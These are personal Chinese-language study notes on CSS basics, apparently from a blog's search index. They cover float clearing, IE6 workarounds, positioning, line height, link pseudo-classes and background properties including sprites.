围绕 浮动的元素如果没有width，会自动收缩为文字的宽 浮动的清除 给浮动的元素的祖先加高 一般不用，因为一般通过内容撑高 clear:both; 可以分左右浮动清理 清楚别人对我的影响 问题：magin失效了，因为两个盒子没高度 隔墙法 中间加一个div用肉体撑出magin 问题：还是没有gao 内墙法 在元素内修一堵墙，则其他浮动的元素可以撑出高 overflow:hidden; 偏方，本来是隐藏超出的元素，但是加了这个父亲可以被浮动的儿子撑出高 可以时magin生效 ie6 _加属性 是ie6的专有属性，解决ie的bug 第一，IE6，不支持小于12px的盒子，任何小于12px的盒子，在IE6中看都大，使用下面第一个语句解决 第二，IE6不支持用overflow:hidden;来清除浮动的使用下面第二个语句解决 定位 分类 相对定位 可以使用复数表示相反方向 本质没有脱离标准文档流，只是自己相对自己的位置进行微调 绝对定位 脱离标准流 祖先无绝对或相对定位 使用top描述以整个页面的左上角为参考点 使用botton描述以浏览器左下角为参考点 有 就近原则 会忽略参考的盒子的padding 绝对定位的居中 因为脱离标准流margin:0 auto; 固定定位 按照浏览器窗口固定，脱离标准流 position:fixed; z-index 定位的元素才有 无单位，正整数默认0 从父现象，父级盒子别盖住，子级在的也没用基本属性 行高 行高 单行文本的居中 文字会在自己的行内居中，一般约定字号和行高都是双数，为了居中单行文本，令行高等于盒子高 多行文本 设置盒子的padding 盒子高度减去总行高，除2，为盒子的padding值，记得减去原来的盒子高 font 属性 使用font属性，能够将字号，行高，字体一起设置 可以使用‘，’添加备选字节 一般将英语字体放最前面，实现中文自动转换 中文字体有英文别名 行高可以用百分百表示 超级链接 超级链接 伪类，根据用户的某种状态的不同 ，有不同的样式 组成 a:link 用户没点击的样式 a:visited 访问过的样式 a:hover 鼠标悬停的样式 a:active 点击不松开的样式 必须以固定的顺序写，lvha,love hate a标签自身不会继承text,font，他用自己的伪类的权重 a标签描述盒子的属性，伪类描述文字的属性样式 伪类可以用逗号写一起 a标签的简化写法，写a标签里面带盒子和属性表示link和visited的样式，在写a：hover表示悬停的样式backgroung background background-color属性 三种颜色表示法 单词 rgb表示法,红绿蓝 rgb(255,0,0) 十六进制，两位看rgb #ff0000 上面可以简化为#f00 background-image 给盒子加上背景图片 background-image:url(images/wuyifan.jpg); 天生会铺满，占用padding区 background-repeat 属性 设置背景图是否重复，默认全背景重复 background-position 背景定位属性,可以传入负数 background-position:向右移动量 向下移动量; css精灵 将要用的图标合成一张图像，利用背景定位显示需要的，减少http请求 可以使用单词描述 background-attachment 背景是否固定 1 background-attachment:fixed; 背景就会被固定住，不会被滚动条滚走。 background 综合 可以省略任意部分]]></content>
      <categories>
        <category>web前端</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>web</tag>
        <tag>html</tag>
        <tag>基础</tag>
        <tag>前端</tag>
        <tag>css</tag>
      </tags>
  </entry>
</search>
